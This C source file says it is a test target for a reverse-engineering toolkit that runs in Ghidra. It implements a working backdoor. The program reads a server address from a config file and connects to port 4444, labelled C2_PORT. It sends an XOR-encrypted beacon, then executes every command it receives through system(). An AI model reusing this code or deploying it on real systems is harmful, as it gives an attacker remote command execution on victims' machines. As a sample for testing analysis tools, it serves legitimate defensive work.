/*
 * re_test_target.c
 * A deliberately multi-function program for testing the RE Toolkit pipeline.
 * Compile, then load into Ghidra and run ExportFunctions.java.
 */

 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
 #ifdef _WIN32
   #include <winsock2.h>
   #include <windows.h>
   #pragma comment(lib, "ws2_32.lib")
   #define SLEEP(ms) Sleep(ms)
 #else
   #include <unistd.h>
   #include <sys/socket.h>
   #include <netinet/in.h>
   #include <arpa/inet.h>
   #define SLEEP(ms) usleep((ms)*1000)
 #endif
 
 /* ── Config ─────────────────────────────────────────────────── */
 #define CONFIG_FILE  "app.cfg"
 #define LOG_FILE     "app.log"
 #define MAX_BUF      1024
 #define XOR_KEY      0x5A
 #define C2_PORT      4444
 
 /* ── Forward declarations ───────────────────────────────────── */
 int  read_config(const char *path, char *out, int maxlen);
 void write_log(const char *msg);
 void xor_crypt(unsigned char *data, int len, unsigned char key);
 int  compute_checksum(const unsigned char *data, int len);
 int  connect_to_host(const char *ip, int port);
 int  send_beacon(int sock, const char *hostname);
 int  recv_command(int sock, char *out, int maxlen);
 void execute_command(const char *cmd);
 char *extract_field(const char *src, const char *key, char *out, int maxlen);
 int  validate_token(const char *token);
 void obfuscate_string(char *s, int len);
 int  main(void);
 
 /* ── File I/O ───────────────────────────────────────────────── */
 
 /* Read a config file into a buffer. Returns bytes read or -1. */
 int read_config(const char *path, char *out, int maxlen) {
     FILE *f = fopen(path, "r");
     if (!f) return -1;
     int n = (int)fread(out, 1, maxlen - 1, f);
     out[n] = '\0';
     fclose(f);
     return n;
 }
 
 /* Append a timestamped message to the log file. */
 void write_log(const char *msg) {
     FILE *f = fopen(LOG_FILE, "a");
     if (!f) return;
     fprintf(f, "[LOG] %s\n", msg);
     fclose(f);
 }
 
 /* ── Crypto-like ────────────────────────────────────────────── */
 
 /* XOR-encrypt or decrypt a buffer in place with a single-byte key. */
 void xor_crypt(unsigned char *data, int len, unsigned char key) {
     for (int i = 0; i < len; i++)
         data[i] ^= key;
 }
 
 /* Simple additive checksum over a byte buffer. */
 int compute_checksum(const unsigned char *data, int len) {
     unsigned int sum = 0;
     for (int i = 0; i < len; i++)
         sum += data[i];
     return (int)(sum & 0xFFFF);
 }
 
 /* ── Network ────────────────────────────────────────────────── */
 
 /* Create a TCP socket and connect to ip:port. Returns fd or -1. */
 int connect_to_host(const char *ip, int port) {
 #ifdef _WIN32
     WSADATA wsa;
     WSAStartup(MAKEWORD(2,2), &wsa);
 #endif
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
 
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family      = AF_INET;
     addr.sin_port        = htons((unsigned short)port);
     addr.sin_addr.s_addr = inet_addr(ip);
 
     if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
         return -1;
     return sock;
 }
 
 /* Send a short beacon message containing the local hostname. */
 int send_beacon(int sock, const char *hostname) {
     char buf[MAX_BUF];
     int len = snprintf(buf, sizeof(buf), "BEACON|%s|1.0\n", hostname);
     xor_crypt((unsigned char *)buf, len, XOR_KEY);
     return (int)send(sock, buf, len, 0);
 }
 
 /* Read a command line from the socket. Returns bytes received or -1. */
 int recv_command(int sock, char *out, int maxlen) {
     int n = (int)recv(sock, out, maxlen - 1, 0);
     if (n <= 0) return -1;
     out[n] = '\0';
     xor_crypt((unsigned char *)out, n, XOR_KEY);
     return n;
 }
 
 /* ── Process ────────────────────────────────────────────────── */
 
 /* Execute a shell command and discard output. */
 void execute_command(const char *cmd) {
     write_log(cmd);
     system(cmd);
 }
 
 /* ── String / parsing ───────────────────────────────────────── */
 
 /* Extract the value of key= from a key=value config string. */
 char *extract_field(const char *src, const char *key, char *out, int maxlen) {
     const char *p = strstr(src, key);
     if (!p) return NULL;
     p += strlen(key);
     if (*p != '=') return NULL;
     p++;
     int i = 0;
     while (*p && *p != '\n' && *p != '\r' && i < maxlen - 1)
         out[i++] = *p++;
     out[i] = '\0';
     return out;
 }
 
 /* Validate a 16-char hex token against a weak checksum. */
 int validate_token(const char *token) {
     if (strlen(token) != 16) return 0;
     unsigned int acc = 0;
     for (int i = 0; i < 16; i++) acc ^= (unsigned char)token[i];
     return (acc == 0xAB);
 }
 
 /* Rotate every character left by 1 bit — trivial "obfuscation". */
 void obfuscate_string(char *s, int len) {
     for (int i = 0; i < len; i++)
         s[i] = (char)(((unsigned char)s[i] << 1) | ((unsigned char)s[i] >> 7));
 }
 
 /* ── Entry point ────────────────────────────────────────────── */
 
 int main(void) {
     char config[MAX_BUF] = {0};
     char c2_ip[64]       = "127.0.0.1";
     char token[32]       = {0};
 
     /* 1. Read config */
     if (read_config(CONFIG_FILE, config, sizeof(config)) > 0) {
         extract_field(config, "server", c2_ip, sizeof(c2_ip));
         extract_field(config, "token",  token,  sizeof(token));
     }
 
     /* 2. Validate token */
     if (!validate_token(token)) {
         write_log("invalid token");
         return 1;
     }
 
     /* 3. Connect and beacon */
     int sock = connect_to_host(c2_ip, C2_PORT);
     if (sock < 0) {
         write_log("connection failed");
         return 1;
     }
 
     char hostname[64] = "test-host";
     send_beacon(sock, hostname);
 
     /* 4. Command loop */
     char cmd[MAX_BUF];
     while (recv_command(sock, cmd, sizeof(cmd)) > 0) {
         if (strncmp(cmd, "EXIT", 4) == 0) break;
         execute_command(cmd);
         SLEEP(500);
     }
 
 #ifdef _WIN32
     closesocket(sock);
     WSACleanup();
 #else
     close(sock);
 #endif
     return 0;
 }